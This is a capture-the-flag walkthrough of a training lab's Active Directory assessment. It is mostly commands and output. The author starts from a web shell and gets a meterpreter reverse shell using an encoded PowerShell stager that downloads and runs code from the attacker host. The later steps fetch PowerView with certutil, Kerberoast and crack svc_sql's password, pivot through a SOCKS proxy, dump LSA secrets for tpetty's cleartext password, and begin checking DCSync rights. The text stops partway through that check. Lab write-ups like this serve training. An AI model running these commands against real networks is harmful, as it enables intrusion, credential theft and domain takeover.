# AD Enumeration & Attacks Skills Assessment I II 


## I 
## Engagement
A team member started an External Penetration Test and was moved to another urgent project before they could finish. 
The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. 
Before switching projects, our teammate left a password-protected web shell (with the credentials: admin:My_W3bsH3ll_P@ssw0rd!) in place for us to start from in the /uploads directory. 
As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. 
Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.

## Objectives

- Submit the contents of the flag.txt file on the administrator Desktop of the web server
- Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer
- Crack the account's password. Submit the cleartext value.
-  Submit the contents of the flag.txt file on the Administrator desktop on MS01
- Find cleartext credentials for another domain user. Submit the username as your answer.
- Submit this user's cleartext password.
- What attack can this user perform?
- Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01

<img width="1919" height="665" alt="image" src="https://github.com/user-attachments/assets/777a6f98-ecf8-4d61-9d4d-0b0423210eba" />

Use the web-based PowerShell to read the first flag from c:\users\administrator\desktop\flag.txt : 

<img width="1116" height="601" alt="image" src="https://github.com/user-attachments/assets/7eb08be7-c3b5-4ca7-a7e8-aa48562bd5ed" />

<img width="1119" height="250" alt="image" src="https://github.com/user-attachments/assets/c0a78f8a-4979-4698-8c91-9009cde5fb28" />

<img width="1225" height="169" alt="image" src="https://github.com/user-attachments/assets/eb296b12-b1db-470b-a563-2e81db84ce2d" />

Elevate their functionalities by getting a reverse shell, using msfconsole and the web_delivery exploit:

<img width="1050" height="718" alt="image" src="https://github.com/user-attachments/assets/bfac5457-98d6-4857-b4e5-bea19cf63cff" />

<img width="1044" height="162" alt="image" src="https://github.com/user-attachments/assets/e7115295-a238-4fe6-90ac-d1c8600cfd8b" />


```
set payload windows/x64/meterpreter/reverse_tcp
set LHOST PWNIP
set SRVHOST PWNIP
set TARGET 2
exploit
```
---->

```
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set LHOST 10.10.14.40
LHOST => 10.10.14.40
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set RHOST 10.129.75.243
[!] Unknown datastore option: RHOST. Did you mean LHOST?
RHOST => 10.129.75.243
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set TARGET 2
TARGET => 2
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.40:4444 
[msf](Jobs:1 Agents:0) exploit(multi/script/web_delivery) >> [*] Using URL: http://10.10.14.40:8080/9SbZDfpoSrQPXM
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAByAGkANwAxAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAHIAaQA3ADEALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJAByAGkANwAxAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4ANAAwADoAOAAwADgAMAAvADkAUwBiAFoARABmAHAAbwBTAHIAUQBQAFgATQAvAEgARABhAGcAbABOAE4AawB2AFkAVwAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4ANAAwADoAOAAwADgAMAAvADkAUwBiAFoARABmAHAAbwBTAHIAUQBQAFgATQAnACkAKQA7AA==

```

Copy and paste the encoded PowerShell command into the Antak web shell. 
Enumerate processes and migrate meterpreter to a more stable process, winlogon.exe:

<img width="1177" height="361" alt="image" src="https://github.com/user-attachments/assets/ac265128-90d2-427d-abee-1ba7b41bbbde" />

--->

<img width="1147" height="263" alt="image" src="https://github.com/user-attachments/assets/1c14d88e-8e18-4626-b69a-a0773e200596" />

<img width="1021" height="579" alt="image" src="https://github.com/user-attachments/assets/ac910007-9f65-4f35-bf41-e0cb56d2c7be" />

```
(Meterpreter 1)(C:\windows\system32\inetsrv) > ps

Process List
============

 PID   PPID  Name         Arch  Session  User               Path
 ---   ----  ----         ----  -------  ----               ----
 0     0     [System Pro
             cess]
 4     0     System       x64   0
 104   4     Registry     x64   0
 300   4     smss.exe     x64   0
 372   640   svchost.exe  x64   0        NT AUTHORITY\NETW  C:\Windows\System3
                                         ORK SERVICE        2\svchost.exe
 380   640   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 388   376   csrss.exe    x64   0
 392   640   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
                                         L SERVICE          2\svchost.exe
 412   1532  w3wp.exe     x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\inetsrv\w3wp.exe
 496   376   wininit.exe  x64   0
 504   488   csrss.exe    x64   1
 564   488   winlogon.ex  x64   1        NT AUTHORITY\SYST  C:\Windows\System3    <---------------------- here 
             e                           EM                 2\winlogon.exe
 640   496   services.ex  x64   0
             e
 660   496   lsass.exe    x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\lsass.exe
 784   640   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 812   496   fontdrvhost  x64   0        Font Driver Host\  C:\Windows\System3
             .exe                        UMFD-0             2\fontdrvhost.exe
 820   564   fontdrvhost  x64   1        Font Driver Host\  C:\Windows\System3
             .exe                        UMFD-1             2\fontdrvhost.exe
 912   640   svchost.exe  x64   0        NT AUTHORITY\NETW  C:\Windows\System3
                                         ORK SERVICE        2\svchost.exe
 1008  640   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
                                         L SERVICE          2\svchost.exe
 1016  640   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
                                         L SERVICE          2\svchost.exe
 1116  640   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
                                         L SERVICE          2\svchost.exe
 1284  640   svchost.exe  x64   0        NT AUTHORITY\NETW  C:\Windows\System3
                                         ORK SERVICE        2\svchost.exe
 1352  640   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 1364  640   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 1372  640   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
                                         L SERVICE          2\svchost.exe
 1392  640   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 1464  640   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 1532  640   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 1548  640   vmtoolsd.ex  x64   0        NT AUTHORITY\SYST  C:\Program Files\V
             e                           EM                 Mware\VMware Tools
                                                            \vmtoolsd.exe
 1588  640   vm3dservice  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
             .exe                        EM                 2\vm3dservice.exe
 1600  640   VGAuthServi  x64   0        NT AUTHORITY\SYST  C:\Program Files\V
             ce.exe                      EM                 Mware\VMware Tools
                                                            \VMware VGAuth\VGA
                                                            uthService.exe
 1628  640   inetinfo.ex  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
             e                           EM                 2\inetsrv\inetinfo
                                                            .exe
 1704  640   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 1732  4036  powershell.  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
             exe                         EM                 2\WindowsPowerShel
                                                            l\v1.0\powershell.
                                                            exe
 1872  1588  vm3dservice  x64   1        NT AUTHORITY\SYST  C:\Windows\System3
             .exe                        EM                 2\vm3dservice.exe
 2388  640   dllhost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\dllhost.exe
 2556  640   msdtc.exe    x64   0        NT AUTHORITY\NETW  C:\Windows\System3
                                         ORK SERVICE        2\msdtc.exe
 2576  784   WmiPrvSE.ex  x64   0        NT AUTHORITY\NETW  C:\Windows\System3
             e                           ORK SERVICE        2\wbem\WmiPrvSE.ex
                                                            e
 2984  564   LogonUI.exe  x64   1        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\LogonUI.exe
 3036  2984  conhost.exe  x64   1        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\conhost.exe
 3392  1588  vm3dservice  x64   1        NT AUTHORITY\SYST  C:\Windows\System3
             .exe                        EM                 2\vm3dservice.exe
 4032  4036  conhost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\conhost.exe
 4036  412   powershell.  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
             exe                         EM                 2\WindowsPowerShel
                                                            l\v1.0\powershell.
                                                            exe
```

```
(Meterpreter 1)(C:\windows\system32\inetsrv) > getpid
Current pid: 1732
```

```
(Meterpreter 1)(C:\windows\system32\inetsrv) > migrate 564
[*] Migrating from 1732 to 564...
[*] Migration completed successfully.
```

Transfer PowerView to the WEB01 machine, starting a Python web server from Pwnbox/PMVPN:


<img width="1027" height="239" alt="image" src="https://github.com/user-attachments/assets/db4564b1-cbe6-4917-86bd-a9067c02bea1" />


From the WEB01 meterpreter, drop to a command shell and download PowerView using certutil.exe. 
Finally, import the module and search for domain users with SPNs; students will find svc_sql as the Kerberoastable account:

<img width="868" height="237" alt="image" src="https://github.com/user-attachments/assets/6e7164f8-19c4-4c71-a9ff-a1901599a3a0" />

```
shell
cd C:\
certutil.exe -f -urlcache -split http://10.10.14.40:8000/PowerView.ps1 PowerView.ps1
powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -SPN | select samaccountname
```

<img width="949" height="574" alt="image" src="https://github.com/user-attachments/assets/43ec3e50-e822-4f43-925c-eaa786d449ce" />

Kerberoast the svc_sql account to obtain its hash:


```
PS C:\> Get-DomainUser -identity svc_sql | get-domainspnticket -format hashcat
Get-DomainUser -identity svc_sql | get-domainspnticket -format hashcat


SamAccountName       : svc_sql
DistinguishedName    : CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQLSvc/SQL01.inlanefreight.local:1433
TicketByteHexStream  : 
Hash                 : $krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$67F1063E9B686C
                       EF572D2C03AF91D05F$B3EDDE51BE49B14C05A25386013B447842071D731CB11BC73ADBC08B56672C7DF1F8DC0003130
                       6A203DD69A09CC18FB2F3325B12A75E99E491A91F3C02574FB98A46F58BC44368AF469581D4F2AA3618A459864EC0E39
                       5B52E3100C87300F2C666444CB25C26C9B09083DBD8937ED340D8970A0B6E58459CCBC94DC3E6872AAD6ECB9A283E490
                       CDF39532231DD39FFA0FD64837E0632CCCBBC2AF73F6ECB3F7B6DC3E67D5FBD93F718CC19EC64075CDFD3F5A5312E8A8
                       021AFA95FF71B1AA615F2CA0FDB0B5897FC92F9C7F01CE748A1C751FE32529A9E79DAE92B6D707E4680196ADA5F57EF1
                       577B7A7809DD716845BD8548F87B8E164B36F2E5952382BD49481E2EC6E265511965D9630FDE886FCDFD6B2F047EAFAA
                       69CDCCB21907516A0FB5DF41C072C3779D24149A6935B5454E3F56134C7C6F02A34AB124F26CB4269EF7D58C8206DC5D
                       408B7AD987C9BC51D5BFA6154B72C8A0702B91C4378CB7C1AD781993A57BCBC7A2964315D219B380E5BEBE1DF7F4189C
                       D02E75730B8FB853A1B4A8FCE264BE90AE5FC48E2187DDC6A36AC403E85FF6A2F1C0CB53BC0E635366CBA8DBC02888B6
                       38F5BAD3227099850F00F62130178407F1979F82991F1ACC9A40C579703AC8A2CE8BC6BCA891D1BE5456416B32BE08B9
                       16836F61F2765A0CB331210DCE8AFEEC42EA2F1B1857FBECF9AAE8A55F8A374A1131E3993A8901C031F4F4DF18574890
                       784009FCD3E3D8E2AE881D8BC64E2A2BAA065F5B2A23A8F05693155C47488988924981E7F5627FB12F92EA4694734457
                       1CB78417A8796B02D649F09EB0772294C72F9E7B735927F8E918687B5A36DF125E564D2ECB0ED4E25D4711D876DA5876
                       5473FA679BEFF82AF563AEAFEBB1240425C614BCEB5EFEA325675C11E0CA552175E532477CA0345C9D9F2D3A061521BD
                       F9123B9261F61300F45F5037BE3ECB283817D72E8FA6B4983761C43E1566730206B9CDFE8B2FDE85F7C88231ECB69831
                       1D0537F77CF4AB5F6D55839E838E013406B22ECEE7EACD03552DAB49933E1CE44B3A5A6BEA90CBD395B43849A14893B8
                       61590D7DEC83895E9F0C0781EBD79E369D5D7A51864E8195A72DCC469B974AB1DAB60A594107987B1F919C6790C6B0F7
                       CF43DBE0E47CDAFC3155046A20F6B030ADA04A10846696E9F21E2B0769C978D45D45A9DA7861BE008B0CB3A0AD043E75
                       6754289DFF161D006C9E457B5C772F91436E9E0FB20C2D5AD47D2955192F71414C54E0777845D6050978CE2025E51508
                       AD2604C1CE6127B5E4D5FA7BC5CCDA7A0A477DBC7A17816507BECAC5F8A2E5E8E9DD0E1FBCAA942532523D97D62FA327
                       8167873E30E48348BBAB13188C2F0DBEBCE4F1D56E099A91DFDC0C733A39BA806C7DECE7DEE39414D1481992B070B45E
                       D046A7377CC4FBCC079565203E522710B9862C62834FD53856DB669CB3780EFDF8D0FAB835A87215EDBDBD9E636ED557
                       93B7447C4BB4001AEC6D07C62891ABB26477E7BC21B3EA3FDFC8B105D5EC31C260E



```

Copy the hash, and then paste into a file, formatting it to remove additional spaces:

```
echo '$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$0A3867FF933AD2
                       5DED73373BEE0B3FB9$1977669A45F691C9FBC9F874DF7D76DB563578A2D15BB8D9FAE83777C118C161B2FBF3A95BB20
                       7E852624D2445290D2DB263E323EC51D01AD05F65F4B3B026FE4D8AAA47075630A838304BC6B9EF3AE1C812C8B3D98F6
                       77F78980E534D09539C244D7265A7CE5AB6EB4199C7E1FA948F9D2694B3B50A712925E87C45D1E124F5594810D188188
                       E5B8CAC54AF0C53D5EFF2B4049E25687F4EA1139F0C3D3DE0B1CB564EDAD172A537A8850D63C1C77E8920046EFB26241
                       BF3F7B161ADA3B2BC4A742950F173AD93B4559F3855DB73059239D22280CC7A93F3890932D885A3C30BA6AB21688CEB7
                       7889A06FF33914CCB29AD3B201A5D83DACD40E2683A0A4AB9B0CC6D749B18E66D43E02DE9F628ADE9E4B88B410EE6523
                       268450793C9B4AFE28E0DEDA975740200F0C9E9FFE9627EE91E7915FD9144BC605BF6C05B38CBC8B3DB59F81458ECE08
                       3BE115AE9D0CEFB20DA896E39D3DC67355495FD00EE8853EED2189C1A7F2FCEDD0B86E3C1AC1B9D8D5E9F23B33BCB84B
                       54268A83826EA653C1767B0EE0E31D8AA13DB3DF9BFEEBBEF3B033659CF98904229FCADDBB57F1C78AFB548EDB2D0392
                       84F76933F5043D3EBD9C964559AF8EF31C42CBC3398604C3A3DD568E1036DF3D91195DA1683A9BB07D5C0FE34D6E9EEE
                       2F0BEE5ADF636547CB57DD2427517340A68BA2F865264846DE286B394642FC7AC279639B8CDF17A2FE4805D6AD2B6C52
                       DD11552F13CD8606D2AEDD3E853E34242BB7622331EE1E9CF4FA666F1276FF0FFB9ED081EB4CD0BCA3E0CE585D2F7025
                       7E8EB7E99C36403BC4F7356603D6A614572DB48CD9A2021CCDB3E875DABB06040FEB8621D77101931CBF66FF045A212F
                       E7BC43917EA0BB734A8BAAAFC77814D4AF11B347232FB3A5B7A653650CEF3FDC78B6B91101F6FBE29232047570FD4996
                       069B4661BE82E19A52059138B96B93C3BA5ED725BCD5D04441159872B6AA01170CAEDB3456CA6F4C7992ADBB35FC1C48
                       4763504AD35D54B079E8A5102C3233C600E38270CE6447697D9A8718BB1ACFED214D6B1D2676B245BD6BC3A217F66E72
                       AFE907E4DCCED8CB86EA978A7A1C429D6731E32A04E2F20B4E3F608C220DF4360CCE80F2EDE10729D1332F482F718DEC
                       637C70E1BC801ACDCDEEB804E2E569F80F9032932EA632DB286B3DFCB9CD7DEED5C751D412A4F1B9D184EEBE5C68162E
                       5DB94EADA75C3607189ADFFE71A58C4F528418B4D20081DAC73A69130FCC2E898A5DB96619311003B0F1993BC724652A
e                      3DC72AEBCD8B080F12278813442C36B3E0874FBAF7C0B404BDD4D03A333C81A0B9B' | tr -d "[:space:]" > tgs_file

```

Crack with hashcat:

```
hashcat -m 13100 tgs_file /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$2f520ef267b5dc8b8c0486deac8a1ac6$9d6b54497f2d45ddb9649e77bc26ee02f8a888275d51c1cb1f10b5365728168536bdf82e3f384a99c55cffb0f38901150a8e248966b818d93347c8e203ff31e331ace4100f85e5974977e5598c23b232761f8ac9ad120b2ca98f73893b7bcbf4a5d0c5829be301a31833de37464bec9d06cb8b2957e79a54feaf5ea941cb54beadc03fd2c89b6c33e5b41c98b55742fa0c44f12658998d44b7b93d29568b04cc592e3c5615912d8211d68314e5de9edc02b21421009f287d33853c90a64cc4962ba658c6c9be2c9e68ef7c6fc40a30feb85b652e0f1e95900422fa1a53dafacdaacd6c4c1d890e4945dc312c2846df6f11a2a1d6b5e4b7c2a23d19c05566e1428b07bc82fac17beb5156932709564a50bb165cb920bf674e74634e69486d14591f3e7d9cd8124bc283e9328d4d446dde2e768b50f5018cc5754dd66c4801096c5369c6a764d068aedf9c8bd3a48e90d0a003df308bd8767af7e857b87d849d8431fe1fdc9d41e47dcdc82da5a15741b13aa078f8a8f646ca99ec1936c7729a32359bee27c4228b034f1c8722ceaef6d41f35540db2d3537d0b46402f773ae1fdecae08325b26236ec7388db59e6ae119a30e337cae78e768a28e7c38109b2949491ac5de7a1fc3dfabcb90cd0ae7b44d3acdcaf104c2b4295a1c8d7ec1b7fe4fc5e6f2630c5312343c8b24e4d7e950631f30ac9c39353c14c4807051568af0614f5f003e79690560afaa00224fba1a1328ecfde2a797502195f8d5aa004539b4da066c9856aa31bd81a9ece1dd0f41ffdf43d42f7e861a475782050fd0205871f9e67265f0eb3bcbeef44f20972c86cce2d5124d3781b3ec5a4ee8b973cf5a5bc13df3df59ee7788a48bb0cd10fa3523efeb3ae3936def6cffbed8dcf41120f11d10aeee13d116437e868bcfb797b873a03303a577ec80f975ae62695700d6729aaea47af3d4f3dbed9f668c7aec643667ded2b1d5912d6ae0ecf364cf27c51d65ca7977588f341a18d61a3dce746c8ea8e997a53d17be78e813516db8d53c84d683b9ee89c8f206943c31b49e269c9e2f8dd60a3f5ef740cec719725e7cee39c8200df0e49115419efedb6128b7b050cf44fa813745a897f156b75a4ca2d833066af9b5a071cd2ab9e4f0ff82d4a08c53a3306dece8d2f030c45449db0ed3a1c2177080f0dc01119b66a8fca13a8b32baf308846445fcc2aae702aa9a681bbf5c90eb83825acc62dd04bc2c8ee9bc4e8098ab6e6dd0aabad3aad0ac34029293c0ff6bb0ef395b17aa8da8e9f055da0fecc168ccd434a8d18656be1de9fa6d4c2f80944161534618effd6cfd059cb72467e3bf04a54c8814de9991b5f0cb7b3d527ddc24db43486499b7ae37d388bc5d2b14fd10bc295a62ab0c79fc310a21726d2e314e7e7599cc492f6fcb9ce8dbad82f882fd1ac2f1f88ec7e623e7f68df88b1b9bac49bfd898f8a031c20750f4b7e45f463d1c56094d38248a964b8951b9d648d1dcaddd054a042272c1b5dc8f56dfd1f20ddc935a73:lucky7
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/S...935a73
Time.Started.....: Thu Apr 21 17:06:26 2022 (0 secs)
Time.Estimated...: Thu Apr 21 17:06:26 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    95198 H/s (12.65ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 16384/14344385 (0.11%)
Rejected.........: 0/16384 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> cocoliso

Started: Thu Apr 21 17:05:29 2022
Stopped: Thu Apr 21 17:06:27 2022
```

Password= `lucky7`

Use WEB01 as a pivot host into the 172.16.6.0/24 network using meterpreter:

<img width="1025" height="300" alt="image" src="https://github.com/user-attachments/assets/63de011f-77bb-4cd5-a2dd-23952633d104" />

<img width="1101" height="163" alt="image" src="https://github.com/user-attachments/assets/e4ad8213-ab02-4f00-baa5-251ba468e887" />

<img width="1232" height="652" alt="image" src="https://github.com/user-attachments/assets/dac1909e-0841-4461-96ad-fe9a8398d08a" />

```
use auxiliary/server/socks_proxy
show options
run
```

```
msf6 auxiliary(scanner/portscan/tcp) > use auxiliary/server/socks_proxy 
msf6 auxiliary(server/socks_proxy) > show options 

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The address to listen on
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)

Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server

msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 5.

[*] Starting the SOCKS proxy server
```

Edit /etc/proxchains.conf, adding the socks5 proxy entry to the bottom of the config file:

```
sudo nano /etc/proxychains.conf
```
<img width="1015" height="281" alt="image" src="https://github.com/user-attachments/assets/1c88d59f-fc34-4e37-b69d-31965b6b3a71" />

Use ProxyChains to run commands against the 172.16.6.0/24 network. Students will need to authenticate to SMB on 172.16.6.50 uitilizing the credentials svc_sql:lucky7:

<img width="1914" height="505" alt="image" src="https://github.com/user-attachments/assets/1177cc31-c274-4143-a7c9-57888b8ece7a" />

Then, using crackmapexec, students can read the flag file from the directory C:\users\administrator\desktop\, finding it to be spn$_r0ast1ng_on_@n_0p3n_f1re:

<img width="1909" height="641" alt="image" src="https://github.com/user-attachments/assets/967b3d4a-a8f0-462d-9821-3b2666beeb97" />


Dump autologon passwords in clear text using crackmapexec: 

```
proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:135-<><>-OK
SMB         172.16.6.50     445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
SMB         172.16.6.50     445    MS01             [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 (Pwn3d!)
SMB         172.16.6.50     445    MS01             [+] Dumping LSA secrets
SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/tpetty:$DCC2$10240#tpetty#685decd67a67f5b6e45a182ed076d801
SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/svc_sql:$DCC2$10240#svc_sql#acc5441d637ce6aabf3a3d9d4f8137fb
SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#9553faad97c2767127df83980f3ac245
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aes256-cts-hmac-sha1-96:b98c9c990c7a08fadbc329c5fe59690a52835b24ef0233ad51af7d6a6338ddb8
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aes128-cts-hmac-sha1-96:2c4a51903a90716c11c54202ed74d040
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:des-cbc-md5:1f8c624601867632
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:plain_password_hex:5e006b00460029006e00460059006a005f006b0020005100640036003400520062005300400026002900280068006e004c0030004000780069003d00210051005d00740051005c006a0064004e004600780072006f007100750057006100400043006400540076005c00580072005e0072006b003b00470058007a00720024006d00480046004c003500600050002a003b003500640044005d00750036004e0063005f0039003500490054005c0031006a004e0030004d0067004f004a006b0022004000280037006a0048003100750034003f003300450059005f0037006f003800620035002d00660063004c003d00
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aad3b435b51404eeaad3b435b51404ee:ecfe27900016073fffef1bb4b2132bb2:::
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\tpetty:Sup3rS3cur3D0m@inU2eR
SMB         172.16.6.50     445    MS01             dpapi_machinekey:0x8dbe842a7352000be08ef80e32bb35609e7d1786
dpapi_userkey:0xb20d199f3d953f7977a6363a69a9fe21d97ecd19
SMB         172.16.6.50     445    MS01             NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63
SMB         172.16.6.50     445    MS01             [+] Dumped 11 LSA secrets to /root/.cme/logs/MS01_172.16.6.50_2022-04-21_180332.secrets and /root/.cme/logs/MS01_172.16.6.50_2022-04-21_180332.cached
```
User:  `tpetty`
Password: `Sup3rS3cur3D0m@inU2eR`

Use meterpreter session on WEB01, navigate to C:\, and then run PowerShell:

```
(Meterpreter 1)(C:\windows\system32\inetsrv) > shell

Process 324 created.
Channel 23 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\windows\system32\inetsrv>cd C:\    
cd C:\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DA7F-3F25

 Directory of C:\

03/30/2022  01:38 AM    <DIR>          inetpub
09/14/2018  11:12 PM    <DIR>          PerfLogs
11/23/2022  07:51 AM           770,279 PowerView.ps1
04/11/2022  04:54 PM    <DIR>          Program Files
03/30/2022  01:37 AM    <DIR>          Program Files (x86)
04/11/2022  04:26 PM    <DIR>          Users
04/11/2022  06:38 PM    <DIR>          Windows
               1 File(s)        770,279 bytes
               6 Dir(s)  34,472,337,408 bytes free

C:\>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\>
```

Use PowerView to enumerate attack vectors for tpetty:

```
PS C:\> Import-Module .\PowerView.ps1

Import-Module .\PowerView.ps1
PS C:\> $sid = Convert-NameToSid tpetty
$sid = Convert-NameToSid tpetty
PS C:\> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
